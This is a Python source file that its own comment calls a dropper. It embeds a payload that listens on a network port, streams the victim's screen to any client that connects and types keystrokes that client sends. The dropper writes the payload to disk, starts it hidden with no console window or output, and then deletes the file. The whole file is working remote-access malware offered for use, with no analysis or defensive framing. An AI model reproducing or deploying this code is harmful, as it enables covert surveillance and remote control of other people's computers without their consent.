import subprocess
import os
import time
import sys
import platform

#same like host6, just a dropper :D

payload_code = """
#GO WITH CLIENT 6
#HAS PYAUTOGUI SO DONT TRY ON THE SAME LAPTOP

import socket
import threading
import keyboard 
import time
import mss
import struct
import numpy as np
import cv2
import json
from queue import Queue

PORT = 5050
FORMAT = 'utf-8'
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
DISCONNECT_MSG = "DISCONNECT"
server_running = True

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow immediate reuse of the port
server.bind(ADDR)
letter_input = Queue()

from functools import wraps
def time_it(func):
    @wraps(func)  
    def wrapper(*args, **kwargs):
        start_time = time.perf_counter()
        result = func(*args, **kwargs)
        end_time = time.perf_counter()
        execution_time = end_time - start_time
        print(f"Function '{func.__name__}' executed in {execution_time:.4f} seconds.")
        return result
    return wrapper

allow_input = True

def toggle_input():
    global allow_input
    allow_input = not allow_input #switch between sending input or not
    print("Allow input is now: " + (str)(allow_input))
    
@time_it
def process_key_event():
    global letter_input, server_running, allow_input
    while server_running:
        time.sleep(0.05) # this is need to stop it from overload, if you remove, it wont capture the whole thing
        if allow_input:
            msg = letter_input.get()
            write_out(msg)

def write_out(msg):
    try:
        data = json.loads(msg)
        if data.get("type") == "hotkey":
            keys = data.get("keys")
            if keys:
                for key in keys:
                    keyboard.press(key)
                for key in reversed(keys):
                    keyboard.release(key)
        else:
            key = data.get("key")
            event_type = data.get("event_type")
            if event_type == "down":
                if key != "caps lock" and key != "`": #ingore the "`" key from the client sending (this is used to toggle input from the client)
                    try:
                        keyboard.press_and_release(key)
                    except ValueError or KeyError:
                        pass #just ignore it
    except json.JSONDecodeError:
        # Handle non-JSON messages if needed.
        pass
    
connections = []  # For multiple connections

@time_it
def handle_input(conn):
    global letter_input
    try:
        while server_running:
            # 1) read header
            try:
                header = conn.recv(4)
            except (ConnectionResetError, ConnectionAbortedError) as e:
                print(f"[INFO] Peer closed/reset connection: {e}")
                break

            if len(header) < 4:
                # no header → clean shutdown
                break

            msg_length = struct.unpack(">L", header)[0]

            # 2) read payload
            data = bytearray()
            while len(data) < msg_length:
                try:
                    packet = conn.recv(msg_length - len(data))
                except (ConnectionResetError, ConnectionAbortedError) as e:
                    print(f"[INFO] Peer aborted during recv: {e}")
                    break
                if not packet:
                    # clean EOF
                    break
                data.extend(packet)

            if len(data) < msg_length:
                break

            message = data.decode("utf-8")
            if message == DISCONNECT_MSG:
                print("[INFO] Received graceful DISCONNECT_MSG.")
                break

            letter_input.put(message)

    finally:
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        conn.close()
        print("[INFO] Closed input handler socket.")

@time_it
def stream_screen(conn):
    target_fps = 240
    frame_interval = 1.0 / target_fps
    last_time = time.time()
    
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while server_running:
            screenshot = sct.grab(monitor)
            frame = np.array(screenshot)

            # Resize frame if needed
            frame = cv2.resize(frame, (960, 540))
            
            #png
            ret, buffer = cv2.imencode('.png', frame)
            
            if not ret:
                continue
            data = buffer.tobytes()  # Directly get bytes instead of pickle dumping
            
            try:
                conn.sendall(struct.pack(">L", len(data)) + data)
            except Exception as e:
                print(f"Connection error: {e}")
                break

            elapsed = time.time() - last_time
            time.sleep(max(0, frame_interval - elapsed))
            last_time = time.time()

@time_it
def handle_client(conn, addr):
    # Start threads for input handling and screen streaming
    print(f"[CONNECT TO] {addr}")
    threading.Thread(target=handle_input, args=(conn,), daemon=True).start()
    threading.Thread(target=stream_screen, args=(conn,), daemon=True).start()
    threading.Thread(target=process_key_event, daemon=True).start()

@time_it
def stop():
    global server_running, connections
    print("[SHUTTING DOWN SERVER] Key 'esc' pressed.")
    server_running = False
    
    # Close all active client connections.
    for conn in list(connections):
        try:
            conn.sendall(DISCONNECT_MSG.encode(FORMAT))
            time.sleep(0.1)  # Wait a bit for the client to get the message
            conn.close()
        except Exception as e:
            print(f"[ERROR] Could not close connection: {e}")
    connections.clear()
    
    keyboard.unhook_all()
    server.close()  # Close the server socket


@time_it
def start_host():
    global server_running
    server.listen()
    server.settimeout(1)  # So accept() doesn’t block forever
    print(f"[LISTENING] Server is listening on {SERVER}:{PORT}")

    keyboard.add_hotkey("esc", stop)
    keyboard.add_hotkey("`", toggle_input)
  
    while server_running:
        try:
            conn, addr = server.accept()
            if not server_running:
                conn.close()
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.start()
            print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")
        except socket.timeout:
            continue
        except OSError:
            break

    print("[SERVER STOPPED]")

#main
if __name__ == "__main__":
    print(f"[STARTING SERVER]: {SERVER}")
    start_host()
    print("[SERVER EXITED]")

"""

def run_payload():
    #linux or window
    #assume the computer has python installed
    if platform.system() == "Windows":
        subprocess.Popen(["python", "making.py"], creationflags=subprocess.CREATE_NO_WINDOW)
    elif platform.system() in ["Linux", "Darwin"]:
        subprocess.Popen(["python3", "making.py"],
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         preexec_fn=os.setpgrp)
    else:
        print("Unknown OS")

def main():
    print("Current working directory:", os.getcwd())
    # write the payload file to disk.
    with open("making.py", "w", encoding='utf-8') as f:
        f.write(payload_code)
    print("Dropped making.py")
    
    # Execute the payload (server)
    run_payload()
    print("Launched making.py.")
    
    time.sleep(0.5)
    
    os.remove("making.py")
    return

if __name__ == "__main__":
    main()
